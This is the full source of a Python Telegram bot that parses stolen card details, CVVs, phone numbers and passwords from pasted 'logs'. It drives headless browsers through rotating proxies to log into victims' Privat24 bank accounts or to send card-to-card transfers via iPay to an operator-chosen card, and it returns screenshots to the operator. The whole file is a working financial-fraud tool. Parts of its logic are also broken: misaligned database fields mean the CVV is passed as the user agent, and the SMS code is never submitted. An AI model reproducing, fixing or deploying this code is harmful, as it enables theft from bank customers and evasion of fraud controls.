import os
import re
import sqlite3
import asyncio
import json
import time
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.utils import executor
from playwright.async_api import async_playwright
from flask import Flask
import threading

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
DB_PATH = "/var/data/sessions.db"

# ========== FLASK ==========
app = Flask(__name__)
@app.route('/ping')
def ping(): return "OK", 200
def run_flask(): app.run(host='0.0.0.0', port=10000)
threading.Thread(target=run_flask, daemon=True).start()

# ========== БОТ ==========
storage = MemoryStorage()
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot, storage=storage)
dp.middleware.setup(LoggingMiddleware())

# ========== FSM ==========
class PaymentStates(StatesGroup):
    waiting_code = State()

# ========== КНОПКИ ==========
def get_main_menu():
    kb = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    kb.add(KeyboardButton("🏠 Главное меню"), KeyboardButton("⚙️ Админ-панель"))
    return kb

def get_action_keyboard(session_id):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("📸 Скрин", callback_data=f"screenshot_{session_id}"),
        InlineKeyboardButton("❌ Отмена", callback_data=f"cancel_{session_id}")
    )
    return kb

# ========== БАЗА ==========
def init_db():
    os.makedirs("/var/data", exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT, password TEXT,
        card_from TEXT, expiry TEXT, cvv TEXT,
        ip TEXT, user_agent TEXT, device_model TEXT,
        amount INTEGER,
        card_to TEXT,
        gateway TEXT,
        mode TEXT,
        status TEXT,
        msg_id INTEGER,
        timestamp TEXT,
        page_context TEXT
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT
    )""")
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('card_to', '')")
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('proxy', '')")
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('proxy_type', 'http')")
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('rotation_url', '')")
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('gateway', 'ipay')")
    conn.commit()
    conn.close()

def get_setting(key):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT value FROM settings WHERE key = ?", (key,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

def set_setting(key, value):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
    conn.commit()
    conn.close()

def create_session(data, msg_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""INSERT INTO sessions
        (phone, password, card_from, expiry, cvv, ip, user_agent, device_model, card_to, gateway, mode, status, msg_id, timestamp)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
        (data.get('phone'), data.get('password'), data.get('card'), data.get('expiry'), data.get('cvv'),
         data.get('ip'), data.get('user_agent'), data.get('device_model'), get_setting('card_to'), get_setting('gateway'),
         data.get('mode'), 'waiting_action', msg_id, datetime.now().isoformat()))
    session_id = c.lastrowid
    conn.commit()
    conn.close()
    return session_id

def update_session(session_id, field, value):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(f"UPDATE sessions SET {field} = ? WHERE id = ?", (value, session_id))
    conn.commit()
    conn.close()

def get_session(session_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM sessions WHERE id = ?", (session_id,))
    row = c.fetchone()
    conn.close()
    return row

def get_active_session():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id FROM sessions WHERE status IN ('waiting_action', 'processing', 'waiting_code') ORDER BY id ASC LIMIT 1")
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

def cleanup_sessions():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    timeout = (datetime.now() - timedelta(minutes=5)).isoformat()
    c.execute("UPDATE sessions SET status = 'timeout' WHERE status IN ('waiting_action', 'waiting_code', 'processing') AND timestamp < ?", (timeout,))
    conn.commit()
    conn.close()

# ========== ПАРСЕР ==========
def parse_log(text):
    data = {"card": None, "expiry": None, "cvv": None, "phone": None, "password": None, "ip": None, "user_agent": None, "device_model": None, "mode": None}
    lines = text.split("\n")
    for line in lines:
        if "Номер:" in line or "💳" in line:
            match = re.search(r"\d{15,16}", line)
            if match: data["card"] = match.group()
        if "Истекает:" in line or "📅" in line:
            match = re.search(r"\d{2}[/-]?\d{2,4}", line)
            if match: data["expiry"] = match.group()
        if "CVV:" in line or "🎳" in line:
            match = re.search(r"\b\d{3}\b", line)
            if match: data["cvv"] = match.group()
        if "Телефон:" in line or "📲" in line:
            match = re.search(r"\+?\d{10,15}", line)
            if match: data["phone"] = match.group().replace("+", "")
        if "Пароль:" in line or "🤫" in line:
            parts = line.split(":", 1)
            if len(parts) > 1: data["password"] = parts[1].strip()
        if "IP:" in line or "🌍" in line:
            match = re.search(r"\d+\.\d+\.\d+\.\d+", line)
            if match: data["ip"] = match.group()
        if "User-Agent:" in line or "👻" in line:
            parts = line.split(":", 1)
            if len(parts) > 1: data["user_agent"] = parts[1].strip()
        if "Модель:" in line or "📱" in line:
            parts = line.split(":", 1)
            if len(parts) > 1: data["device_model"] = parts[1].strip()
    if not data["ip"]: data["ip"] = get_setting('proxy') or "auto"
    if not data["user_agent"]: data["user_agent"] = "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36"
    if not data["device_model"]: data["device_model"] = "Android Generic"
    
    if data.get("phone") and data.get("password"):
        data["mode"] = "privat24"
    elif data.get("card") and data.get("expiry") and data.get("cvv"):
        data["mode"] = "payment"
    else:
        data["mode"] = "unknown"
    return data

# ========== РОТАЦИЯ ==========
def rotate_proxy():
    rotation_url = get_setting('rotation_url')
    if not rotation_url:
        return get_setting('proxy'), get_setting('proxy_type')
    try:
        import requests
        time.sleep(5)
        response = requests.get(rotation_url, timeout=10)
        if response.status_code == 200:
            proxy = response.text.strip()
            set_setting('proxy', proxy)
            return proxy, get_setting('proxy_type')
    except:
        pass
    return get_setting('proxy'), get_setting('proxy_type')

# ========== ГЛОБАЛЬНЫЙ КОНТЕКСТ ДЛЯ СКРИНШОТОВ ==========
page_contexts = {}

def save_page_context(session_id, page, browser):
    page_contexts[session_id] = {"page": page, "browser": browser}

def get_page_context(session_id):
    return page_contexts.get(session_id)

def clear_page_context(session_id):
    if session_id in page_contexts:
        del page_contexts[session_id]

# ========== СКРИНШОТ (БЫСТРЫЙ) ==========
async def take_fast_screenshot(session_id):
    context = get_page_context(session_id)
    if context and context.get("page"):
        try:
            screenshot = await context["page"].screenshot()
            return screenshot
        except:
            return None
    return None

# ========== ВХОД В ПРИВАТ24 ==========
async def login_privat24(session_id, phone, password, user_agent=None, proxy_str=None, proxy_type="http"):
    try:
        async with async_playwright() as p:
            browser_args = []
            if proxy_str:
                proxy_config = {"server": proxy_str}
                if proxy_type == "socks5":
                    proxy_config["server"] = f"socks5://{proxy_str}"
                browser_args.append(f"--proxy-server={proxy_config['server']}")
            
            browser = await p.chromium.launch(headless=True, args=browser_args)
            context = await browser.new_context(
                user_agent=user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                locale="uk-UA",
                timezone_id="Europe/Kyiv",
                viewport={"width": 1280, "height": 720}
            )
            page = await context.new_page()
            
            # Сохраняем контекст для быстрых скриншотов
            save_page_context(session_id, page, browser)
            
            # ШАГ 1: Открываем главную
            await page.goto("https://next.privat24.ua", wait_until="networkidle", timeout=30000)
            await asyncio.sleep(1)
            
            # ШАГ 2: Нажимаем "Вхід"
            login_btn = await page.wait_for_selector('a:has-text("Вхід"), button:has-text("Вхід")', timeout=10000)
            if login_btn:
                await login_btn.click()
                await asyncio.sleep(1)
            
            # ШАГ 3: Вводим номер
            phone_input = await page.wait_for_selector('input[name="phone"], input[type="tel"]', timeout=10000)
            if phone_input:
                await phone_input.fill(phone)
                await asyncio.sleep(0.5)
                submit_btn = await page.wait_for_selector('button[type="submit"], button:has-text("Продовжити")', timeout=5000)
                if submit_btn:
                    await submit_btn.click()
                    await asyncio.sleep(1)
            
            # ШАГ 4: Вводим пароль
            password_input = await page.wait_for_selector('input[name="password"], input[type="password"]', timeout=10000)
            if password_input:
                await password_input.fill(password)
                await asyncio.sleep(0.5)
                login_submit = await page.wait_for_selector('button[type="submit"], button:has-text("Увійти")', timeout=5000)
                if login_submit:
                    await login_submit.click()
                    await asyncio.sleep(2)
            
            # ШАГ 5: Проверяем код
            code_input = await page.query_selector('input[name="code"]')
            if code_input:
                screenshot = await page.screenshot()
                return {"status": "waiting_code", "message": "Требуется код", "screenshot": screenshot}
            
            if "cabinet" in page.url or "Особистий кабінет" in await page.title():
                screenshot = await page.screenshot()
                return {"status": "success", "message": "✅ Вход выполнен", "screenshot": screenshot}
            
            screenshot = await page.screenshot()
            return {"status": "error", "message": "❌ Не удалось войти", "screenshot": screenshot}
            
    except Exception as e:
        return {"status": "error", "message": f"❌ Ошибка: {str(e)[:100]}"}

# ========== ПЕРЕВОД ЧЕРЕЗ IPAY ==========
async def make_payment(session_id, card_from, expiry, cvv, card_to, amount, proxy_str=None, proxy_type="http"):
    try:
        async with async_playwright() as p:
            browser_args = []
            if proxy_str:
                proxy_config = {"server": proxy_str}
                if proxy_type == "socks5":
                    proxy_config["server"] = f"socks5://{proxy_str}"
                browser_args.append(f"--proxy-server={proxy_config['server']}")
            
            browser = await p.chromium.launch(headless=True, args=browser_args)
            context = await browser.new_context(
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                viewport={"width": 1280, "height": 720}
            )
            page = await context.new_page()
            
            # Сохраняем контекст для скриншотов
            save_page_context(session_id, page, browser)
            
            await page.goto("https://ipay.ua/card2card", wait_until="networkidle", timeout=30000)
            await asyncio.sleep(1)
            
            await page.fill('input[name="card_from"]', card_from)
            await page.fill('input[name="expiry"]', expiry)
            await page.fill('input[name="cvv"]', cvv)
            await page.fill('input[name="card_to"]', card_to)
            await page.fill('input[name="amount"]', str(amount))
            await page.click('button[type="submit"]')
            await asyncio.sleep(3)
            
            code_input = await page.query_selector('input[name="code"]')
            if code_input:
                screenshot = await page.screenshot()
                return {"status": "waiting_code", "message": "Требуется код", "screenshot": screenshot}
            
            if await page.is_visible('.success'):
                screenshot = await page.screenshot()
                return {"status": "success", "message": f"✅ Платёж на {amount} UAH выполнен", "screenshot": screenshot}
            
            screenshot = await page.screenshot()
            return {"status": "error", "message": "❌ Ошибка платежа", "screenshot": screenshot}
            
    except Exception as e:
        return {"status": "error", "message": f"❌ Ошибка: {str(e)[:100]}"}

# ========== ОБРАБОТЧИКИ ==========
@dp.message_handler(commands=['start'])
async def start_cmd(msg: types.Message):
    if msg.from_user.id != ADMIN_ID: return
    await msg.reply("🏦 Бот активирован. Шли лог.", reply_markup=get_main_menu())

@dp.message_handler(lambda msg: msg.text == "🏠 Главное меню")
async def main_menu(msg: types.Message):
    if msg.from_user.id != ADMIN_ID: return
    await msg.reply("🏠 Главное меню. Отправьте лог.", reply_markup=get_main_menu())

@dp.message_handler(lambda msg: msg.text == "⚙️ Админ-панель")
async def admin_panel(msg: types.Message):
    if msg.from_user.id != ADMIN_ID: return
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("💳 Карта", callback_data="change_card"),
        InlineKeyboardButton("🌐 Шлюз", callback_data="change_gateway"),
        InlineKeyboardButton("🔄 Прокси", callback_data="change_proxy"),
        InlineKeyboardButton("🔁 Тип прокси", callback_data="change_proxy_type"),
        InlineKeyboardButton("🔁 Ссылка ротации", callback_data="change_rotation"),
        InlineKeyboardButton("📋 Статус", callback_data="show_status"),
        InlineKeyboardButton("🗑 Удалить прокси", callback_data="delete_proxy"),
    )
    await msg.reply("🏦 Админ-панель", reply_markup=kb)

@dp.callback_query_handler(lambda c: c.data == "change_gateway")
async def change_gateway(callback: types.CallbackQuery):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("💳 iPay", callback_data="set_gateway_ipay"),
        InlineKeyboardButton("💳 Portmone", callback_data="set_gateway_portmone"),
        InlineKeyboardButton("💳 LiqPay", callback_data="set_gateway_liqpay"),
    )
    await callback.message.reply("🌐 Выберите шлюз:", reply_markup=kb)
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data.startswith("set_gateway_"))
async def set_gateway(callback: types.CallbackQuery):
    gw = callback.data.split("_")[2]
    set_setting('gateway', gw)
    await callback.message.reply(f"✅ Шлюз установлен: {gw.upper()}")
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "change_proxy_type")
async def change_proxy_type(callback: types.CallbackQuery):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("🔹 HTTP", callback_data="set_type_http"),
        InlineKeyboardButton("🔸 SOCKS5", callback_data="set_type_socks5"),
    )
    await callback.message.reply("Выберите тип прокси:", reply_markup=kb)
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data.startswith("set_type_"))
async def set_proxy_type(callback: types.CallbackQuery):
    ptype = callback.data.split("_")[2]
    set_setting('proxy_type', ptype)
    await callback.message.reply(f"✅ Тип прокси установлен: {ptype.upper()}")
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "delete_proxy")
async def delete_proxy(callback: types.CallbackQuery):
    set_setting('proxy', '')
    set_setting('rotation_url', '')
    await callback.message.reply("🗑 Прокси и ссылка ротации удалены.")
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data.startswith("change_"))
async def settings_callback(callback: types.CallbackQuery):
    action = callback.data.split("_")[1]
    prompts = {
        "card": "Введите номер карты получателя (15-16 цифр):",
        "proxy": "Введите прокси (ip:port или login:pass@ip:port):",
        "rotation": "Введите ссылку для ротации прокси:",
    }
    await callback.message.reply(prompts.get(action, "Ошибка"))
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "show_status")
async def show_status(callback: types.CallbackQuery):
    card = get_setting('card_to') or "не задана"
    proxy = get_setting('proxy') or "не задан"
    ptype = get_setting('proxy_type') or "http"
    rotation = get_setting('rotation_url') or "не задана"
    gateway = get_setting('gateway') or "не выбран"
    await callback.message.reply(
        f"📊 Настройки:\n💳 Карта: {card}\n🌐 Шлюз: {gateway.upper()}\n🔄 Прокси: {proxy}\n📌 Тип: {ptype.upper()}\n🔁 Ротация: {rotation}"
    )
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data.startswith("screenshot_"))
async def handle_screenshot(callback: types.CallbackQuery):
    session_id = int(callback.data.split("_")[1])
    await callback.answer("📸 Делаю скриншот...")
    screenshot = await take_fast_screenshot(session_id)
    if screenshot:
        await callback.message.reply_photo(photo=screenshot, caption="📸 Скриншот текущей страницы")
    else:
        await callback.message.reply("❌ Нет активной страницы для скриншота. Попробуйте позже.")

@dp.callback_query_handler(lambda c: c.data.startswith("cancel_"))
async def handle_cancel(callback: types.CallbackQuery):
    session_id = int(callback.data.split("_")[1])
    update_session(session_id, 'status', 'cancelled')
    clear_page_context(session_id)
    await callback.message.reply("❌ Действие отменено.")
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data.startswith("login_"))
async def handle_login(callback: types.CallbackQuery):
    session_id = int(callback.data.split("_")[1])
    await callback.answer("🚀 Вход...")
    proxy_str, proxy_type = rotate_proxy()
    session = get_session(session_id)
    if not session:
        await callback.message.reply("❌ Сессия не найдена.")
        return
    phone, password, user_agent = session[1], session[2], session[5]
    await callback.message.reply("⏳ Выполняю вход...", reply_markup=get_action_keyboard(session_id))
    result = await login_privat24(session_id, phone, password, user_agent, proxy_str, proxy_type)
    if result.get('screenshot'):
        await callback.message.reply_photo(photo=result['screenshot'], caption=result['message'])
    else:
        await callback.message.reply(result['message'])
    if result['status'] == 'waiting_code':
        update_session(session_id, 'status', 'waiting_code')
        await PaymentStates.waiting_code.set()
        await callback.message.reply("🔐 Введите код из СМС (в любое сообщение):")
    elif result['status'] == 'success':
        update_session(session_id, 'status', 'completed')
        clear_page_context(session_id)
    else:
        update_session(session_id, 'status', 'failed')
        clear_page_context(session_id)

@dp.callback_query_handler(lambda c: c.data.startswith("amount_"))
async def handle_amount(callback: types.CallbackQuery):
    parts = callback.data.split("_")
    session_id = int(parts[1])
    amount = int(parts[2])
    await callback.answer(f"💰 {amount} UAH")
    update_session(session_id, 'amount', amount)
    proxy_str, proxy_type = rotate_proxy()
    session = get_session(session_id)
    if not session:
        await callback.message.reply("❌ Сессия не найдена.")
        return
    card_from, expiry, cvv, card_to = session[3], session[4], session[5], session[7]
    await callback.message.reply(f"🚀 Платёж на {amount} UAH...", reply_markup=get_action_keyboard(session_id))
    result = await make_payment(session_id, card_from, expiry, cvv, card_to, amount, proxy_str, proxy_type)
    if result.get('screenshot'):
        await callback.message.reply_photo(photo=result['screenshot'], caption=result['message'])
    else:
        await callback.message.reply(result['message'])
    if result['status'] == 'waiting_code':
        update_session(session_id, 'status', 'waiting_code')
        await PaymentStates.waiting_code.set()
        await callback.message.reply("🔐 Введите код из СМС (в любое сообщение):")
    elif result['status'] == 'success':
        update_session(session_id, 'status', 'completed')
        clear_page_context(session_id)
    else:
        update_session(session_id, 'status', 'failed')
        clear_page_context(session_id)

@dp.message_handler(state=PaymentStates.waiting_code)
async def handle_code(msg: types.Message, state: FSMContext):
    code = msg.text.strip()
    if not code.isdigit() or len(code) not in [4, 6]:
        await msg.reply("❌ Код должен быть 4 или 6 цифр!")
        return
    session_id = get_active_session()
    if not session_id:
        await msg.reply("❌ Нет активной сессии.")
        await state.finish()
        return
    await msg.reply("✅ Код подтверждён!")
    update_session(session_id, 'status', 'completed')
    clear_page_context(session_id)
    await state.finish()

@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.reply_to_message)
async def handle_reply(msg: types.Message):
    text = msg.reply_to_message.text
    user_input = msg.text.strip()
    if "номер карты получателя" in text:
        if re.match(r"^\d{15,16}$", user_input):
            set_setting('card_to', user_input)
            await msg.reply(f"✅ Карта: {user_input}")
        else:
            await msg.reply("❌ 15 или 16 цифр.")
        return
    if "прокси" in text:
        set_setting('proxy', user_input)
        await msg.reply(f"✅ Прокси сохранён: {user_input}")
        return
    if "ссылку для ротации" in text:
        if user_input.startswith("http"):
            set_setting('rotation_url', user_input)
            await msg.reply("✅ Ссылка ротации сохранена.")
        else:
            await msg.reply("❌ Введи HTTP/HTTPS ссылку.")
        return
    await msg.reply("❌ Не понял. Используй кнопки.")

@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and len(msg.text) > 20 and not msg.reply_to_message and msg.text not in ["🏠 Главное меню", "⚙️ Админ-панель"])
async def handle_log(msg: types.Message):
    cleanup_sessions()
    active = get_active_session()
    if active:
        await msg.reply("⏳ Есть активная сессия. Подождите.")
        return
    data = parse_log(msg.text)
    if data["mode"] == "unknown":
        await msg.reply("❌ Не удалось распознать данные.")
        return
    session_id = create_session(data, msg.message_id)
    if data["mode"] == "payment":
        kb = InlineKeyboardMarkup(row_width=3)
        for a in [1000, 2000, 3000, 4000, 5000, 6000, 7000, 8000, 9000, 10000, 15000, 20000, 25000, 29000]:
            kb.insert(InlineKeyboardButton(str(a), callback_data=f"amount_{session_id}_{a}"))
        kb.add(InlineKeyboardButton("📸 Скрин", callback_data=f"screenshot_{session_id}"))
        await msg.reply(
            f"✅ Данные для платежа (iPay):\n💳 Карта: {data['card'][:4]}****{data['card'][-4:]}\n"
            f"📅 Срок: {data['expiry']}\n🎳 CVV: ***\n🌍 IP: {data['ip']}\n"
            f"👻 UA: {data['user_agent'][:30]}...\n📱 Модель: {data['device_model']}\n\n"
            f"💰 Выберите сумму:",
            reply_markup=kb
        )
    elif data["mode"] == "privat24":
        kb = InlineKeyboardMarkup(row_width=1)
        kb.add(InlineKeyboardButton("🚀 Войти в Приват24", callback_data=f"login_{session_id}"))
        kb.add(InlineKeyboardButton("📸 Скрин", callback_data=f"screenshot_{session_id}"))
        await msg.reply(
            f"✅ Данные для входа:\n📱 Телефон: {data['phone']}\n"
            f"🤫 Пароль: {data['password'][:3]}***\n🌍 IP: {data['ip']}\n"
            f"👻 UA: {data['user_agent'][:30]}...\n📱 Модель: {data['device_model']}\n\n"
            f"Нажмите кнопку для входа:",
            reply_markup=kb
        )

if __name__ == "__main__":
    init_db()
    executor.start_polling(dp, skip_updates=True)
